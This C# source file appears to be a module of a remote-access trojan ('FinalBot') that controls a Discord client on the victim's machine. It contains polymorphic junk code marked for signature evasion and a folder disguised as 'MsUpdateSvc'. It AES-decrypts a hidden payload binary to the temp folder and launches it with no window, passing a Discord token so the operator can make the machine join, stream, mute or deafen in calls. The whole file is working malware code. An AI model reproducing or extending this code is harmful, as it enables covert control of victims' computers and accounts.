using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using VanguardCore;

namespace FinalBot.Modules
{
    public static class DiscordRemoteManager
    {
        // [POLY_JUNK]
        private static void _vanguard_addd76dc() {
            int val = 70307;
            if (val > 50000) Console.WriteLine("Hash:" + 70307);
        }

        private static readonly string _tempDir = Path.Combine(Path.GetTempPath(), "FinalTempSys");
        private static readonly string _profileDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "MsUpdateSvc", "DiscordProfile");

        public static string LaunchDiscordBot(string token, string url, string action = "join")
        {
            try
            {
                // Control logic
                if (action == "mute_mic" || action == "deafen" || action == "deaf" || action == "stream" || action == "disconnect")
                {
                    string cmdFile = Path.Combine(Path.GetTempPath(), "discord_cmd.txt");
                    File.WriteAllText(cmdFile, action == "deaf" ? "deafen" : action);
                    return $"⚡ Command `{action}` signaled.";
                }

                if (!Directory.Exists(_tempDir)) Directory.CreateDirectory(_tempDir);
                string tempExe = Path.Combine(Path.GetTempPath(), "discord_bot_v2.exe");

                // 2. Decrypt if not already decrypted this session
                if (!File.Exists(tempExe))
                {
                    string binPath = Path.Combine(VanguardCore.Modules.ResourceModule.WorkDir, "discord_bot.bin");
                    if (!File.Exists(binPath)) return "❌ Failed: Binary 'discord_bot.bin' not found.";

                    byte[] encrypted = File.ReadAllBytes(binPath);
                    byte[] decrypted = AesHelper.Decrypt(encrypted);
                    if (decrypted != null) File.WriteAllBytes(tempExe, decrypted);
                    else return "❌ Failed: AES decryption of 'discord_bot.bin' failed.";
                }

                // Ensure profile dir exists
                if (!Directory.Exists(_profileDir)) Directory.CreateDirectory(_profileDir);

                // Launch the EXE
                Process.Start(new ProcessStartInfo
                {
                    FileName = tempExe,
                    Arguments = $"\"{token}\" \"{url}\" \"{action}\" --profile \"{_profileDir}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                return $"✅ Discord Remote launched: Action `{action}` started.";
            }
            catch (Exception ex)
            {
                return $"❌ Error launching Discord bot: {ex.Message}";
            }
        }
    }
}
